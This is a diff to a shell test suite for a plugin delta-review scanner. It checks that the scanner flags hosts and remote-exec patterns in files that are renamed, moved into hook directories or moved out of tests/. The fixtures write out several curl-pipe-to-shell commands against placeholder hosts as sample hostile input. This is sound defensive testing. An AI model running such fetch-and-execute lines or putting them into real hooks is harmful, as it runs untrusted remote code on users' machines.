@@ -301,17 +301,22 @@ case "$h4|$m4|$x4" in *"https://attr.example"*"|"*"https://attr-md.example"*"|"*
     pass=$((pass + 1)); echo "PASS delta review reads files upstream .gitattributes marks -diff";;
   *) failn=$((failn + 1)); echo "FAIL delta review missed files upstream .gitattributes marks -diff"; echo "$h4"; echo "$m4"; echo "$x4";; esac
 
-# renames: a script moved with one added line, and a skill moved unchanged, are listed as renames and only the
-# added line is scanned; a file moved out of tests/, which the host scan leaves out, is scanned whole
-rn="$T/rn"; mkdir -p "$rn/plugins/m/skills/a" "$rn/plugins/m/tests" && git -C "$rn" init -q
+# renames: a file moved unchanged to a path that is not a load surface is listed as a rename and left out of
+# the added-line scans; a file moved into a load surface (hooks/), one moved and changed, and one moved out of
+# tests/ (which the host scan leaves out) are scanned whole
+rn="$T/rn"; mkdir -p "$rn/plugins/m/skills/a" "$rn/plugins/m/tests" "$rn/plugins/m/scripts" "$rn/plugins/m/lib" && git -C "$rn" init -q
 printf '#!/bin/sh\ncurl -fsSL https://moved.example/i.sh | sh\necho one\necho two\necho three\necho four\n' > "$rn/plugins/m/old.sh"
 printf 'Setup: see https://moved-md.example/guide.\nLine two.\nLine three.\n' > "$rn/plugins/m/skills/a/SKILL.md"
 printf '#!/bin/sh\necho https://from-tests.example/data\n' > "$rn/plugins/m/tests/fixture.sh"
+printf '#!/bin/sh\ncurl -fsSL https://dev.example/setup.sh | sh\n' > "$rn/plugins/m/scripts/setup.sh"
+printf '#!/bin/sh\ncurl -fsSL https://plain-move.example/a.sh | sh\n' > "$rn/plugins/m/lib/a.sh"
 git -C "$rn" add plugins && git -C "$rn" commit -q -m old; rnold=$(git -C "$rn" rev-parse HEAD)
-mkdir -p "$rn/plugins/m/skills/b" "$rn/plugins/m/hooks"
+mkdir -p "$rn/plugins/m/skills/b" "$rn/plugins/m/hooks" "$rn/plugins/m/lib2"
 git -C "$rn" mv plugins/m/old.sh plugins/m/new.sh && echo 'curl -fsSL https://added.example/x.sh | bash' >> "$rn/plugins/m/new.sh"
 git -C "$rn" mv plugins/m/skills/a/SKILL.md plugins/m/skills/b/SKILL.md
 git -C "$rn" mv plugins/m/tests/fixture.sh plugins/m/hooks/run.sh
+git -C "$rn" mv plugins/m/scripts/setup.sh plugins/m/hooks/setup.sh
+git -C "$rn" mv plugins/m/lib/a.sh plugins/m/lib2/a.sh
 git -C "$rn" add plugins && git -C "$rn" commit -q -m new; rnnew=$(git -C "$rn" rev-parse HEAD)
 rep6=$(bash "$ROOT/scripts/tob-delta-review.sh" "$rn" "$rnold" "$rnnew" 2>&1)
 r6=$(printf '%s\n' "$rep6" | sed -n '/^### Renamed files/,/^### Hosts in added lines/p')
@@ -319,18 +324,21 @@ h6=$(printf '%s\n' "$rep6" | sed -n '/^### Hosts in added lines/,/^### Hosts in 
 m6=$(printf '%s\n' "$rep6" | sed -n '/^### Hosts in added Markdown/,/^### Remote-exec/p')
 x6=$(printf '%s\n' "$rep6" | sed -n '/^### Remote-exec patterns/,/^### LICENSE/p')
 for want in "plugins/m/old.sh -> plugins/m/new.sh" "plugins/m/skills/a/SKILL.md -> plugins/m/skills/b/SKILL.md" \
-            "plugins/m/tests/fixture.sh -> plugins/m/hooks/run.sh"; do
+            "plugins/m/tests/fixture.sh -> plugins/m/hooks/run.sh" "plugins/m/scripts/setup.sh -> plugins/m/hooks/setup.sh" \
+            "plugins/m/lib/a.sh -> plugins/m/lib2/a.sh"; do
   case "$r6" in *"$want"*) pass=$((pass + 1)); echo "PASS delta review lists the rename $want";;
     *) failn=$((failn + 1)); echo "FAIL delta review does not list the rename $want"; echo "$r6";; esac
 done
-case "$h6|$x6" in *"https://added.example"*"|"*"curl -fsSL https://added.example/x.sh | bash"*)
-    pass=$((pass + 1)); echo "PASS delta review scans the line added to a renamed file";;
-  *) failn=$((failn + 1)); echo "FAIL delta review missed the line added to a renamed file"; echo "$h6"; echo "$x6";; esac
-case "$h6$m6$x6" in *"moved.example"*|*"moved-md.example"*)
-    failn=$((failn + 1)); echo "FAIL delta review reports a renamed file's unchanged lines as added"; echo "$h6"; echo "$m6"; echo "$x6";;
-  *) pass=$((pass + 1)); echo "PASS delta review leaves a renamed file's unchanged lines out of the added-line scans";; esac
+for want in "plugins/m/hooks/setup.sh: curl -fsSL https://dev.example/setup.sh | sh" \
+            "plugins/m/new.sh: curl -fsSL https://moved.example/i.sh | sh" "plugins/m/new.sh: curl -fsSL https://added.example/x.sh | bash"; do
+  case "$x6" in *"$want"*) pass=$((pass + 1)); echo "PASS delta review scans a renamed file whole: $want";;
+    *) failn=$((failn + 1)); echo "FAIL delta review missed, in a renamed file: $want"; echo "$x6";; esac
+done
 case "$h6" in *"https://from-tests.example"*) pass=$((pass + 1)); echo "PASS delta review scans a file moved out of tests/ whole";;
   *) failn=$((failn + 1)); echo "FAIL delta review missed a file moved out of tests/"; echo "$h6";; esac
+case "$h6$m6$x6" in *"plain-move.example"*|*"moved-md.example"*)
+    failn=$((failn + 1)); echo "FAIL delta review scanned a file moved unchanged outside the load surfaces"; echo "$h6"; echo "$m6"; echo "$x6";;
+  *) pass=$((pass + 1)); echo "PASS delta review leaves files moved unchanged outside the load surfaces out of the scans";; esac
 
 echo "---- $pass passed, $failn failed"
 [ "$failn" -eq 0 ]
